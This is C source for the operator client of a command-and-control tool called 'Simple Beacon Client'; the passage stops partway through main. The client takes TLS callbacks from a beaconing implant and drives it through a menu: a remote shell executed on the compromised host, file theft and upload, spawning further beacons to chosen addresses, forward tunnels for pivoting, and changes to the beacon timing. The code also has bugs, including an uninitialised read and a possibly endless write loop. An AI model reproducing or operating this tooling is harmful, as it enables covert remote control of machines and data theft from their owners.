#include "client.h"

#define USAGE                                                                 \
"usage:\n"                                                                    \
"  echoclient [options]\n"                                                    \
"options:\n"                                                                  \
"  -a                  Address to send the message.\n"                        \
"  -p                  Port to send to.\n"                                    \
"  -h                  Show this help message\n"                              \

/* OPTIONS DESCRIPTOR ====================================================== */
static struct option gLongOptions[] = {
  {"authenticate",     required_argument,      NULL,           'a'},
  {"port",             required_argument,      NULL,           'p'},
  {"help",             no_argument,            NULL,           'h'},
  {NULL,               0,                      NULL,             0}
};

/**
 * Upon recieving a connection, establish an SSL session, authenticate to the server, and kick off 
 * the cmdloop so that the user can choose what to do while in a session with the server.
 */
int entersession(SSL *ssl, char *auth) {
  uint8_t buf[4096] = {0};
  int sd, exit = 0;

  // Accept the inbound SSL connection
  while(SSL_accept(ssl) != 1) {continue;}
  
  // Do not bother the application with retry data
  SSL_set_mode(ssl, SSL_MODE_AUTO_RETRY);

  // Print the encryption cipher suite that was negotiated
  printf("[+] Connected with %s encryption\n", SSL_get_cipher(ssl));

  // Read the message sent which should be a request to authenticate "authenticate" is passed.
  if ((ssl_readall(ssl, buf, sizeof(buf)) < 0)) {     
    exit = FAIL;
    goto cleanup;
  }         
  if (strcmp((char *)buf, "10") != 0) {
    fprintf(stderr, "[-] Server did not indicate it was ready for authentication. Recieved: %s.\n", buf);                             
    exit = FAIL;
    goto cleanup;
  }
  printf("[+] Server is ready for authentication.\n");

  // Send the authentication message
  printf("[*] Authenticating with: %s\n", auth);
  if (ssl_writeall(ssl, (uint8_t *)auth, strlen(auth)) < 0) {
    exit = FAIL;
    goto cleanup;
  }
  if (ssl_writeall(ssl, (uint8_t *)"", 1) < 0) {
    exit = FAIL;
    goto cleanup;
  }
  printf("[*] Authentication message sent.\n");
  
  // Check to make sure the server is happy with the auth message
  //  3 shots at getting the right message else server initiates disconnect.
  memset(buf, 0, sizeof(buf));
  if ((ssl_readall(ssl, buf, sizeof(buf))) < 0) {
    fprintf(stderr, "[-] Error reading from the server. Exiting now.\n");
    exit = FAIL;
    goto cleanup;
  }
  while(strcmp((char *)buf, "50") == 0) {
    fprintf(stderr, "[-] Authentication messages did not match. Please input the proper message.\n");
    printf("> Enter Authentication Message: ");
    memset(buf, 0, sizeof(buf));
    fgets((char *)buf, 4096, stdin);
    printf("[*] About to send: %s", buf);
    if (ssl_writeall(ssl, buf, sizeof(buf)) < 0) {
      fprintf(stderr, "[-] Error writing new authentication message to the server. Exiting now.\n");
      exit = FAIL;
      goto cleanup;
    }
    memset(buf, 0, sizeof(buf));
    if (ssl_readall(ssl, buf, sizeof(buf)) < 0) {
      fprintf(stderr, "[-] Error reading from the server. Exiting now.\n");
      exit = FAIL;
      goto cleanup;
    }
  }
  free(auth);
  printf("[+] Successfully authenticated! Entering session.\n");

  // Print Help Menu and then enter into menued context
  displayhelp();
  while(1) {
    if (cmdloop(ssl) <= 0) {
      break;
    }
  }

  cleanup:
  sd = SSL_get_fd(ssl);                       // Get socket connection
  SSL_free(ssl);                              // Release SSL state
  close(sd);                                  // Close connection
  return exit;
}

/**
 * Dispaly the help menue while in a session with the server. This indcates what commands can be run
 * and what they are intedned to do for the user.
 */
void displayhelp() {
  fprintf(stderr, 
    "=====================================\n"
    "   Simple Beacon Client Help Menu\n"
    "=====================================\n"
    "sbc> new -- Spawn a new beacon.\n"
    "sbc> cmd -- Enter a shell.\n"
    "sbc> get -- Get a file.\n"
    "sbc> put -- Put up a file.\n"
    "sbc> tun -- Start a tunnel.\n"
    "sbc> win -- Change the beacon time.\n"
    "sbc> bye -- Exit the client.\n"
    "=====================================\n"
  );
}

/**
 * Determines which command the user wants to run from the interface, and runs the command returning the result 
 * from the called function to the entersession logic.
 */
int cmdloop(SSL* ssl) {
  uint8_t msg[4096] = {0};
  
  printf("sbc> ");
  fgets((char *)msg, 4096, stdin);
  msg[strcspn((char *)msg, "\r\n")] = 0;
  
  if ((strcmp((char *)msg, "new")) == 0) {
    return newconn(ssl);
  }
  if ((strcmp((char *)msg, "cmd")) == 0) {
    return cmdshell(ssl);
  }
  if ((strcmp((char *)msg, "get")) == 0) {
    return getfile(ssl);
  }
  if ((strcmp((char *)msg, "put")) == 0) {
    return putfile(ssl);
  }
  if ((strcmp((char *)msg, "tun")) == 0) {
    return tunnel(ssl);
  }
  if ((strcmp((char *)msg, "win")) == 0) {
    return winset(ssl);
  }
  if ((strcmp((char *)msg, "bye")) == 0) {
    ssl_writeall(ssl, (uint8_t *)"7", 2);
    return 0;
  }
  displayhelp();
  return SUCCESS;
}

/**
 * Tells the server to spawn a new instance of itself with the specified prot and address to beacon out to.
 * 
 * Note: When the primary instance of the shell is shutdown properly all of the children will be killed. If the server 
 * reverts to beaconing behavior at any point in time the server will kill the children. If the server is forcibly 
 * stopped on the remote side the processes will likely become zombie processes.
 */
int newconn(SSL *ssl) {
  uint8_t ans[16] = {0};
  char port[6];
  char addr[INET6_ADDRSTRLEN];

  printf("Enter the call out IP address: ");
  fgets(addr,sizeof(addr),stdin);

  printf("Enter the port: ");
  fgets(port, sizeof(port),stdin);

  if (atoi(port) < 0 || atoi(port) > 65535) {
    fprintf(stderr, "[-] The given port must be between 1-65535");
    return RECOVER;
  }

  // Send the command to the remote server
  if (ssl_writeall(ssl, (uint8_t *)"1", 2) < 0) {return FAIL;}

  // Check to make sure the server is gtg.
  if (ssl_readall(ssl, ans, 4) < 0) {return FAIL;}
  if (strcmp((char *)ans, "100") != 0) {
    fprintf(stderr, "[-] Unexpected answer from server while setting up: %s.\n", ans);
    return RECOVER;
  }

  // Write the address to the server.
  if (ssl_writeall(ssl, (uint8_t *)addr, sizeof(addr)) < 0) {return FAIL;}

  // Check to make sure the server recieved it.
  memset(ans, 0, sizeof(ans));
  if (ssl_readall(ssl, ans, 4) < 0) {return FAIL;}
  if (strcmp((char *)ans, "101") != 0) {
    fprintf(stderr, "[-] Unexpected answer from the server: %s.\n", ans);
    return RECOVER;
  }

  // Write the port to the server.
  if (ssl_writeall(ssl, (uint8_t *)port, sizeof(port)) < 0) {return FAIL;}

  // Check to make sure the server recieved it.
  memset(ans, 0, sizeof(ans));
  if (ssl_readall(ssl, ans, 4) < 0) {return FAIL;}
  if (strcmp((char *)ans, "102") != 0) {
    fprintf(stderr, "[-] Unexpected answer from the server: %s.\n", ans);
    return RECOVER;
  }

  // Get the process id from the server
  memset(ans, 0, sizeof(ans));
  if (ssl_readall(ssl, ans, sizeof(ans)) < 0) {return FAIL;}
  printf("[+] Kicked off new process with the following pid: %s\n", ans);
  
  return SUCCESS;
}

/**
 * Opens a simple inteface for sending commands to popen on the server. For this reason the interface
 * will hang if the user attempts to run interactive commands or any user interaction is expected at all.
 * Erros can be redirected back to the user by placing 2>&1 in the appropriate locations when typing the command.
 * Future implementations will likely contain an interface that passes a pty interface back and forth over the socket.
 */
int cmdshell(SSL *ssl) {
  uint8_t buf[4096] = {0};

  // Send the command to the remote server
  if (ssl_writeall(ssl, (uint8_t *)"2", 2) < 0) {return FAIL;}

  // Wait for the server to send back the date command.
  if (ssl_readall(ssl, buf, sizeof(buf)) < 0) {return FAIL;}
  printf("Remote Shell Activated At: %s", buf);

  // Start a command loop -- interactive commands like vim, tmux, top, bash, will hang the terminal.
  //  this is because I am using a unidirectional pipe provided by popen. Could consider pipe, fork, exec later.
  while (1) {
    printf("sbsh> ");

    memset(buf, 0, sizeof(buf));
    fgets((char *)buf, sizeof(buf), stdin);
    if (strcmp((char *)buf, "exit\n") == 0) {
      if (ssl_writeall(ssl, buf, sizeof(buf)) < 0) {return FAIL;}
      break;
    }

    if (strcmp((char *)buf, "\n") == 0) {
      continue;
    }

    if (ssl_writeall(ssl, buf, sizeof(buf)) < 0) {return FAIL;}

    memset(buf, 0, sizeof(buf));
    while((ssl_readall(ssl, buf, sizeof(buf))) > 0) {
      if (strlen((char *)buf) == 0) {
        SSL_read(ssl, buf, 1);
        memset(buf, 0, sizeof(buf));
        break;
      }
      printf("%s", buf);
      memset(buf, 0, sizeof(buf));
    }
  }

  return SUCCESS;
}

/**
 * Recieve a file from the server
 * On ssl socket errors the client will exit. The server should resume beaconing behavior.
 */
int getfile(SSL *ssl) {
  FILE *fd;
  uint8_t ans[256] = {0};
  uint8_t buf[4096] = {0};
  uint8_t localpath[4096];
  uint8_t remotepath[4096];
  ssize_t filesize = 0;
  size_t written = 0;

  printf("Enter the remote file path: ");
  fgets((char *)remotepath, sizeof(remotepath), stdin);
  trim((char *)remotepath);

  printf("Enter the local file path: ");
  fgets((char *)localpath, sizeof(localpath), stdin);
  trim((char *)localpath);

  // Create or open the local file 
  if ((fd = fopen((char *)localpath, "a")) == NULL) {
    perror("[-] ERROR: Could not open designated local file");
    return RECOVER;    
  }

  // Send the server a message letting it know we would like to recieve a file
  if (ssl_writeall(ssl, (uint8_t *)"3", 2) < 0 ) {goto failure;}

  // Make sure the server is good to go with allowing us to recieve a file
  if (ssl_readall(ssl, ans, 4) < 0) {goto failure;}
  if (strcmp((char *)ans, "300") != 0) {
    fprintf(stderr, "[-] Unexpected answer from server while setting up: %s.\n", ans);
    return RECOVER;
  }

  // Send the file name that we would like to get 
  if (ssl_writeall(ssl, remotepath, sizeof(remotepath)) < 0) {goto failure;}

  // If the server can open the file it will send us the size of the file to be recieved
  memset(ans, 0, sizeof(ans));
  if (ssl_readall(ssl, ans, sizeof(ans)) < 0) {goto failure;}
  filesize = atoi((char *)ans);
  if (filesize < 1) {
    fprintf(stderr, "[-] There was an error getting the size of the remote file.\n");
    return RECOVER;
  }

  // Download the file
  printf("[*] Getting remote file %s and placing at %s.\n", remotepath, localpath);
  while(written < (size_t)filesize) {
    if (ssl_readall(ssl, buf, sizeof(buf)) < 0) {goto failure;}
    fprintf(fd, "%s", buf);
    written += strlen((char *)buf);
    memset(buf, 0, sizeof(buf));
  }
  fclose(fd);

  printf("[+] Wrote %ld bytes to %s.\n", written, localpath);

  return SUCCESS;

  failure:
  fclose(fd);
  return FAIL;
}

/**
 * Place a file on the server.
 * On ssl socket errors the client will exit. The server should resume beaconing behavior.
 */
int putfile(SSL *ssl) {
  FILE *fd;
  uint8_t ans[256] = {0};
  uint8_t buf[4096] = {0};
  uint8_t localpath[4096];
  uint8_t remotepath[4096];
  ssize_t filesize = 0;
  size_t readin = 0;
  struct stat st;

  printf("Enter the local file path: ");
  fgets((char *)localpath, sizeof(localpath), stdin);
  trim((char *)localpath);

  printf("Enter the remote file path: ");
  fgets((char *)remotepath, sizeof(remotepath), stdin);
  trim((char *)remotepath);

  // Create or open the local file 
  if ((fd = fopen((char *)localpath, "r")) == NULL) {
    perror("[-] ERROR: Could not open designated local file");
    return RECOVER;    
  }

  // Send the server a message letting it know we would like to put a file up
  if (ssl_writeall(ssl, (uint8_t *)"4", 2) < 0) {goto failure;}

  // Make sure the server is good to go with allowing us to recieve a file
  if (ssl_readall(ssl, ans, 4) < 0) {goto failure;}
  if (strcmp((char *)ans, "400") != 0) {
    fprintf(stderr, "[-] Unexpected answer from server while setting up: %s\n", ans);
    return RECOVER;
  }

  // Send the file name that we would like to put our new file up as
  if (ssl_writeall(ssl, remotepath, sizeof(remotepath)) < 0) {goto failure;}

  // Check to ensure the server was able to open the remote file.
  memset(ans, 0, sizeof(ans));
  if (ssl_readall(ssl, ans, 4) < 0) {goto failure;}
  if (strcmp((char *)ans, "401") != 0) {
    fprintf(stderr, "[-] The server was unable to open the remote file path for writing.\n");
    return RECOVER;
  }

  // Get the file size and then rewind to the begining of the file
  fstat(fileno(fd), &st);
  filesize = st.st_size;
  sprintf((char *)ans, "%ld", filesize);
  if (ssl_writeall(ssl, ans, sizeof(ans)) < 0) {goto failure;}

  // Send the file
  printf("[*] Putting local file %s on remote and placing at %s.\n", localpath, remotepath);

  while(readin < (size_t)filesize) {
    memset(buf, 0, sizeof(buf));
    fgets((char *)buf, sizeof(buf), fd);
    readin += strlen((char *)buf);
    if (ssl_writeall(ssl, buf, sizeof(buf)) < 0) {goto failure;}
  }
  printf("[+] Sent %ld bytes to remote server to be placed in %s.\n", readin, remotepath);

  fclose(fd);
  return SUCCESS;

  failure:
  fclose(fd);
  return FAIL;
}

/**
 * Based on user input call for either a forward or reverse tunnel to be setup.
 * The client will remain in this mode until the user indicates they would like to shutdown the tunnel
 * or it detects a read/write error on either of the sockets. In the event of a socket error while in the 
 * loop the server will revert to its beaconing behavior.
 */
int tunnel(SSL *ssl) {
  int efd;
  uint8_t ans[16] = {0};
  char type[12] = {0};
  char lport[12] = {0};
  char dport[12] = {0};
  char addr[INET6_ADDRSTRLEN] = {0};

  // Check which type of tunnel we want to setup
  printf("Which type of tunnel (forward, reverse): ");
  fgets(type, sizeof(type), stdin);
  trim(type);
  //clearstdin();

  // Grab the port that we want to listen on locally
  printf("Enter the port to listen on: ");
  fgets(lport, sizeof(lport), stdin);
  trim(lport);
  //clearstdin();

  // Grab the address that we want to point our tunnel at
  printf("Enter the desitnation IP address: ");
  fgets(addr, sizeof(addr), stdin);
  trim(addr);
  //clearstdin();

  // Grab the port we want to aim our tunnel at
  printf("Enter the desitnation IP address: ");
  fgets(dport, sizeof(dport), stdin);
  trim(dport);
  //clearstdin();

  // Set the epoll file descriptor
  if ((efd = epoll_create1(0)) < 0) {
    fprintf(stderr, "[-] Could not open epoll file descriptor. Returning to main menu.\n");
    return RECOVER;
  }

  // Tell the server that we are starting a tunnel command
  if (ssl_writeall(ssl, (uint8_t *)"5", 2) < 0) {return FAIL;}

  // Recieve the response from the server
  if (ssl_readall(ssl, ans, 4) < 0) {return FAIL;}
  
  // The server failed to setup an epoll file descriptor
  if (strcmp((char *)ans, "530") == 0) {
    fprintf(stderr, "[-] Server was unable to create epoll structure, reverting to beacon, exiting now\n");
    return FAIL;
  }

  // Check to make sure the server is gtg
  if (strcmp((char *)ans, "500") != 0) {
    fprintf(stderr, "[-] Unexpected code recieved from server: %s\n", ans);
    return FAIL;
  } 

  // Based on the tunnel type enter into that command loop
  if (strcmp(type, "forward") == 0) {
    return forward_tunnel(ssl, efd, lport, dport, addr);
  } else if (strcmp(type, "reverse") == 0) {
    //return reverse_tunnel(ssl, efd, &port, &addr);
  } else {
    printf("[-] Unrecognized tunnel type, please try again.\n");
    return RECOVER;
  }
  return SUCCESS;
}

/**
 * Setup a forward tunnel when called from the tunnel function. The client will open a listener and wait for
 * connections. Upon recieving a connection it will alert the server to make a connection to the target address 
 * and port and facilitate tunneling traffic to the end destination. 
 * The client will remain in this mode until the user indicates they would like to shutdown the tunnel
 * or it detects a read/write error on either of the sockets. In the event of a socket error while in the 
 * loop the server will revert to its beaconing behavior.
 */ 
int forward_tunnel(SSL *ssl, int efd, char *lport, char *dport, char *addr) {
  int res;
  int r, x, y;
  int tunport;
  int sfd, ffd;
  int keepcnt = 5;
  int keepidle = 30; 
  int keepintvl = 30;
  int keepalive = 1;
  int n, max = 128;
  int ssl_fd = SSL_get_fd(ssl);
  //size_t readin = 0;
  //size_t written = 0;
  uint8_t tmp[8] = {0};
  uint8_t ans[16] = {0};
  uint8_t buf[4096] = {0};
  char tunaddr[INET6_ADDRSTRLEN];
  struct timeval timeout;      
  struct epoll_event event;
  struct epoll_event *events;
  struct sockaddr_storage peer;   
  struct sockaddr_storage target;       
  socklen_t socklen = sizeof(target);     
  socklen_t peerlen;                      

  // Signal to the server that we are using a forward tunnel
  if (ssl_writeall(ssl, (uint8_t *)"51", 3) < 0) {return FAIL;}

  // Ensure that the server is gtg.
  if (ssl_readall(ssl, ans, 4) < 0) {return FAIL;}
  if (strcmp((char *)ans, "510") != 0) {
    fprintf(stderr, "[-] Unexpected server response: %s.\n", ans);
    return FAIL;
  }

  // Tell the server which address and port to point the tunnel at
  if (ssl_writeall(ssl, (uint8_t *)addr, strlen(addr) + 1) < 0) {return FAIL;}
  if (ssl_writeall(ssl, (uint8_t *)dport, strlen(dport) + 1) < 0) {return FAIL;}

  // Setup the listner
  if (setuplistner(atoi(lport), &sfd) != SUCCESS) {return FAIL;}

  // Register stdin with epoll to see if the user has typed something into the tunnel window.
  event.data.fd = 0;  // 0 is stdin.
  event.events = EPOLLIN | EPOLLET;
  if (epoll_ctl(efd, EPOLL_CTL_ADD, 0, &event) == -1) {return FAIL;}

  // Register the default descriptor to track - sfd in this case
  memset(&event, 0, sizeof(event));
  event.data.fd = sfd;
  event.events = EPOLLIN | EPOLLET;
  if (epoll_ctl(efd, EPOLL_CTL_ADD, sfd, &event) == -1) {return FAIL;}

  // Buffer for the events to be tracked
  if ((events = calloc(max, sizeof(event))) == NULL) {
    fprintf(stderr, "[-] Unable to initialize the event queue.\n");
    return FAIL;
  }

  printf("[*] To exit the tunnel interface type 'close' and press enter.\n");
  // Enter into the forward tunnel loop
  while(1) {
    // Wait for events 
    n = epoll_wait(efd, events, max, -1);

    // Loop over the alerts
    for (int i = 0; i < n; i++) {
      if (events[i].events & EPOLLERR || events[i].events & EPOLLHUP || (!events[i].events & EPOLLIN)) {
        close(events[i].data.fd);
        continue;
      } 
      // Handle user input -- if they want to exit shut down everything and return to the menu.
      else if (0 == events[i].data.fd) {
        memset(ans, 0, sizeof(ans));
        fgets((char *)ans, sizeof(ans), stdin);
        trim((char *)ans);
        if (strcmp((char *)ans, "close") == 0) {
          if (ssl_writeall(ssl, (uint8_t *)"514", 4) < 0) {goto loop_fail;}
          close(ffd);
          close(sfd);
          free(events);
          return SUCCESS;
        }
      }
      // Handle inbound connections 
      else if (sfd == events[i].data.fd) {
        // Accept the connection
        printf("[+] Detected new connection - accepting call.\n");
        if ((ffd = accept(sfd, (struct sockaddr *)&target, &socklen)) < 0) {goto loop_fail;}
        
        // Set keepalives
        if (setsockopt(ffd, SOL_SOCKET, SO_KEEPALIVE, &keepalive, sizeof(int)) < 0) {goto loop_fail;}
        if (setsockopt(ffd, IPPROTO_TCP, TCP_KEEPCNT, &keepcnt, sizeof(int)) < 0) {goto loop_fail;}
        if (setsockopt(ffd, IPPROTO_TCP, TCP_KEEPIDLE, &keepidle, sizeof(int)) < 0) {goto loop_fail;}
        if (setsockopt(ffd, IPPROTO_TCP, TCP_KEEPINTVL, &keepintvl, sizeof(int)) < 0) {goto loop_fail;}

        // Set socket timeout values
        timeout.tv_sec = 0;
        timeout.tv_usec = 250;
        if (setsockopt(ffd, SOL_SOCKET, SO_RCVTIMEO, (void *)&timeout, sizeof(timeout)) < 0) {goto loop_fail;}
        if (setsockopt(ffd, SOL_SOCKET, SO_SNDTIMEO, (void *)&timeout, sizeof(timeout)) < 0) {goto loop_fail;}

        // Put the socket into non-blocking mode
        if (fcntl(ffd, F_SETFL, O_NONBLOCK) < 0) {goto loop_fail;}

        // Print who we are speaking to.
        peerlen = sizeof(peer);
        getpeername(ffd, (struct sockaddr*)&peer, &peerlen);
        if (peer.ss_family == AF_INET) {
          struct sockaddr_in *p = (struct sockaddr_in *)&peer;
          tunport = ntohs(p->sin_port);
          inet_ntop(AF_INET, &p->sin_addr, tunaddr, sizeof(tunaddr));
        } else { // AF_INET6
          struct sockaddr_in6 *p = (struct sockaddr_in6 *)&peer;
          tunport = ntohs(p->sin6_port);
          inet_ntop(AF_INET6, &p->sin6_addr, tunaddr, sizeof(tunaddr));
        } 
        printf("[+] Successfully setup connection with tunnel client at %s:%d.\n", tunaddr, tunport);

        // Add the event to the event queue - connected socket
        memset(&event, 0, sizeof(event));
        event.data.fd = ffd;
        event.events = EPOLLIN | EPOLLET;
        if (epoll_ctl(efd, EPOLL_CTL_ADD, ffd, &event) == -1) {goto loop_fail;}

        // Add the event to the event queue - client socket
        memset(&event, 0, sizeof(event));
        event.data.fd = ssl_fd;
        event.events = EPOLLIN | EPOLLET;
        if (epoll_ctl(efd, EPOLL_CTL_ADD, ssl_fd, &event) == -1) {goto loop_fail;}

        // Message the client to alert them to the new connection
        printf("[+] Sending message to server to initiate the server setup.\n");
        ssl_writeall(ssl, (uint8_t *)"511", 4);
        printf("[+] Message sent successfully!\n");
      } 
      // This branch handles incoming data from the target to the tunnel
      else if (ffd == events[i].data.fd) {
        memset(buf, 0, sizeof(buf));
        res = read(ffd, buf, sizeof(buf));
        if (res < 0) {
          if (errno != EAGAIN || errno != EWOULDBLOCK) {
            goto loop_fail;
          }
          continue;
        } else if (res == 0) {
          printf("[*] Target attatched to tunnel disconnected.\n");
          ssl_writeall(ssl, (uint8_t *)"513", 4);
          close(ffd);
          continue;
        }
        printf("[+] About to send %d bytes.\n", res);
        fwrite(buf, 1, res, stdout);
        memset(tmp, 0, sizeof(tmp));
        sprintf((char *)tmp, "%d", res);
        if (ssl_writeall(ssl, (uint8_t *)"512", 4) < 0) {goto loop_fail;}
        if (ssl_writeall(ssl, (uint8_t *)tmp, sizeof(tmp)) < 0) {goto loop_fail;}
        printf("[+] SEND TO SERVER BUFFER: %s", buf);
        if (ssl_writeall(ssl, buf, res) < 0) {goto loop_fail;}
      } 
      // This branch handles incoming data from the client side tunnel target
      else if (ssl_fd == events[i].data.fd) {
        memset(buf, 0, sizeof(buf));
        r = 0;
        r = SSL_read(ssl, buf, sizeof(buf));
        fwrite(buf, 1, sizeof(buf), stdout);
        printf("\n");
        while (r > 0) {
          x = 0;
          while(x < r) {
            y = write(ffd, buf + x, r - 1);
            if (y == -1) {
              if (errno != EAGAIN || errno != EWOULDBLOCK) {
                continue;
              } else {
                y = 0;
              }
            }
            x += y;
          }
        }
      } 
      // We should never hit this branch but if we do just see if we can carry on.
      else {  
        goto loop_fail;
      } // Done checking specific event
    } // Done checking updated events
  } // Loop for reverse tunnel

  loop_fail:
  printf("[-] The loop failed for some reason...\n");
  if (ffd > 0) {
    close(ffd);
  }
  if (sfd > 0) {
    close(sfd);
  }
  free(events);
  return FAIL;
}

/**
 * Setup either a forward or reverse tunnel.
 * The client will remain in this mode until the user indicates they would like to shutdown the tunnel
 * or it detects a read/write error on either of the sockets. In the event of a socket error while in the 
 * loop the server will revert to its beaconing behavior.
 */ 
/*
int reverse_tunnel(SSL *ssl, int efd, char *port, char *addr) {

}
*/

/**
 * Set the time to sleep between each beacon the server will send. On error the server 
 * will revert to the beaconing behavior that was previously set.
 */
int winset(SSL *ssl) {
  char time[256];
  uint8_t ans[4] = {0};

  printf("Enter the amount of time in seconds to wait between each beacon: ");
  fgets(time, sizeof(time),stdin);

  if (atoi(time) <= 0) {
    fprintf(stderr, "[-] The given time must be greater than 0");
    return RECOVER;
  }

  // Send the command to the server
  if (ssl_writeall(ssl, (uint8_t *)"6", 2) < 0) {return FAIL;}

  if (ssl_readall(ssl, ans, sizeof(ans)) < 0) {return FAIL;}
  if (strcmp((char *)ans, "600") != 0) {
    fprintf(stderr, "[-] Unexpected answer from server while setting up: %s.\n", ans);
    return RECOVER;
  }

  // Write the address to the server.
  if (ssl_writeall(ssl, (uint8_t *)time, sizeof(time)) < 0) {return FAIL;}

  // Check to make sure the server recieved it.
  memset(ans, 0, sizeof(ans));
  if (ssl_readall(ssl, ans, sizeof(ans)) < 0) {return FAIL;}
  if (strcmp((char *)ans, "601") != 0) {
    fprintf(stderr, "[-] Unexpected answer from the server: %s.\n", ans);
    return RECOVER;
  }

  return SUCCESS;
}

/**
 * This is a helper function which removes trailing white space from the passed string.
 */
void trim(char *str) {
  int i = 0, index = -1;

  while(str[i] != '\0') {
    if(!isspace(str[i])) {
      index = i;
    }
    i++;
  }
  str[index+1] = '\0';
}

/**
 * Clear the prompt standard input to make sure we don't overflow buffers when reading in user input.
 */
void clearstdin() {
  int c; 
  while (c != '\n' && c != EOF) {
    c = getchar();
  }
}

/**
 * Set up a listening socket on a specified port
 */
int setuplistner(int port, int *sockfd) {
  int status;
  int optval = 1;
  char portstr[6];
  struct addrinfo hints, *servinfo, *p;

  // Populate the hints for the following getaddrinfo()
  memset(&hints, 0, sizeof hints);    // Ensure the struct is empty
  hints.ai_family = AF_UNSPEC;        // Indiferent to IPv4 or IPv6
  hints.ai_socktype = SOCK_STREAM;    // TCP stream socket
  hints.ai_flags = AI_PASSIVE;        // Populate the IP for me

  // Get a string version of the port to bind to
  snprintf(portstr, 6,"%d", port);

  // Get address info
  if ((status = getaddrinfo(NULL, portstr, &hints, &servinfo)) != 0) {
    fprintf(stderr, "[-] Failed to acquire getaddrinfo: %s\n", gai_strerror(status));
    return FAIL;
  };

  // Loop through all returned interfaces and bind to the first viable one
  for(p = servinfo; p != NULL; p = p->ai_next) {
    // Check to see if the addrsocket works
    if ((*sockfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
      perror("[-] Unable to acquire a socket.");
      continue;
    }

    // Attempt to set socket to reuseaddr
    if (setsockopt(*sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(int)) == -1) {
      perror("[-] Unable to set socket reuse.");
      return FAIL;
    }

    // Bind to the specified port using the socket
    if (bind(*sockfd, p->ai_addr, p->ai_addrlen) == -1) {
      close(*sockfd);
      perror("[-] Unable to bind the socket.");
      continue;
    }
    break;
  }

  freeaddrinfo(servinfo);  // All done with the struct at this point

  // Report errors if we are unable to bind
  if (p == NULL) {
    fprintf(stderr, "[-] Failed to bind to %d\n", port);
    return FAIL;
  }

  // Attempt to listen
  if (listen(*sockfd, 2) == -1) {
    perror("[-] Failed to listen.");
    return FAIL;
  }

  // The socket is now listening and ready to be utilized
  // Pass the sockfd back to the main program to be utilized
  printf("[+] Client has started listening on 0.0.0.0:%s.\n", portstr);
  printf("[*] Awaiting connections from server.\n");
  return SUCCESS; 
}

/**
 * Parse and validate the command line arguments passed to the client.
 */
int parseargs(int argc, char **argv, char **auth, int *port) {
  int option_char;
  char *authentication;
  int portno;

  // Parse and set command line arguments
  while ((option_char = getopt_long(argc, argv, "a:p:h", gLongOptions, NULL)) != -1) {
    switch (option_char) {
      case 'a':         // The authentication string to utilize
        authentication = optarg;
        break;
      case 'p':         // The port number to send traffic to. 
        portno = atoi(optarg);
        break;
      case 'h':         // Help message
        fprintf(stdout, "%s", USAGE);
        exit(0);
        break;
      default:
        fprintf(stderr, "%s", USAGE);
        exit(1);
    }
  }

  // Bounds and intialization checking
  if ((portno <= 0) || (portno > 65535)) {
    fprintf(stderr, "[-] ERROR: %s @ %d: invalid port number (%d).\n", __FILE__, __LINE__, portno);
    return FAIL;
  }

  *auth = calloc((strlen(authentication)+1), sizeof(char));
  if (auth == NULL) {
    fprintf(stderr, "[-] ERROR: Failed to allocate memory for the message.\n");
    return FAIL;
  }

  // Assign variable contents
  memcpy(*auth, authentication, (strlen(authentication)+1));
  (*port) = portno;

  return SUCCESS;
}

/**
 * Helper function to ensure the entire buffer gets read during non-blocking SSL_reads.
 */
ssize_t ssl_readall(SSL *ssl, uint8_t *buf, size_t len) {
    int r = 0;
    size_t recvd = 0;

    while (recvd < len) {
      r = SSL_read(ssl, &buf[recvd], len-recvd);
      if (r < 0) {
        perror("[-] ERROR: SSL_read encountered and error");
        break;
      } else if (r == 0) {
        break;
      } else {
        recvd += r;
        if (strcmp((char *)&buf[recvd-1], (char *)"\0") == 0) {
          break;
        }
      }
    }
    return r;
}

/**
 * Helper function to ensure the entire buffer gets read during non-blocking SSL_writes.
 */
ssize_t ssl_writeall(SSL *ssl, uint8_t *msg, size_t len) {
  int s = 0;
  size_t sent = 0;

  while (sent < len) {
    if ((s = SSL_write(ssl,  &msg[sent], len-sent)) < 0) {
      perror("[-] ERROR: SSL_write encountered an error");
      break;
    }
    sent += s;
  }

  return s;
}

/**
 * Helper function to ensure the entire buffer is read from a traditional fd socket
 */
ssize_t readall(int fd, uint8_t *buf, size_t len, size_t *total_read) {
  ssize_t r = 0;
  size_t readin = 0;

  while(readin < len) {
    if ((r = read(fd, &buf[readin], len-readin)) <= 0) {
      break;
    }
    (*total_read) +=r;
    readin += r;
  }

  return r;
}

/**
 * Helper function to ensure the entire buffer is written to a traditional fd socket
 */
ssize_t writeall(int fd, uint8_t *buf, size_t len, size_t *total_written) {
  ssize_t w = 0;
  size_t written = 0;
  
  while(written < len) {
    if ((w = write(fd, &buf[written], len-written)) < 0) {
      perror("[-] ERROR: Write function encountered an error");
      break;
    } else if (w == 0) {
      break;
    }
    (*total_written) += w;
    written += w;
  }

  return w;
}

/**
 * Helper function properly load the ssl certs into memory.
 */
void loadcert(SSL_CTX* ctx, char *cert, char *key) {
    // Set the local certificate from CertFile
    if (SSL_CTX_use_certificate_file(ctx, cert, SSL_FILETYPE_PEM) <= 0 ) {
        ERR_print_errors_fp(stderr);
        abort();
    }
    // Set the private key from KeyFile
    if (SSL_CTX_use_PrivateKey_file(ctx, key, SSL_FILETYPE_PEM) <= 0 ) {
        ERR_print_errors_fp(stderr);
        abort();
    }
    // Verify the private key
    if (!SSL_CTX_check_private_key(ctx) ) {
        fprintf(stderr, "[-] Private key does not match the public certificate\n");
        abort();
    }
}

/**
 * Helping function to intialize SSL helper libraries and establish contexts
 */
SSL_CTX* initCTX(void) {
  SSL_CTX *ctx;
  const SSL_METHOD *method;

  OpenSSL_add_all_algorithms();       // Load & register all cryptos, etc.
  SSL_load_error_strings();           // Load all error messages
  method = TLS_server_method();   // Create new server-method instance
  ctx = SSL_CTX_new(method);          // Create new context from method
  if (ctx == NULL) {                  // Check for errors
    ERR_print_errors_fp(stderr);
    abort();
  }

  return ctx;
}

/**
 * The main program logic. Kicks off a client to listen on the specified port. Upon receiving a connection
 * the client will attempt to authenticate with the specified authentication string. The SSL certificates 
 * must be stored on disk. Their relative location of the certificates to the sbc binary is defined in the 
 * header file. To kick off the client use the following command:
 * 
 * ./sbc -a "ASimplePasswordForASimpleTool" -p 993
 */
int main(int argc, char **argv) {
    int keepalive = 1;                      // Enable TCP keepalive probes for the socket
    int keepcnt = 3;                        // Send a maximum of 3 probes that are unanswered
    int keepidle = 5;                       // Send the first one after being idle for 5 seconds
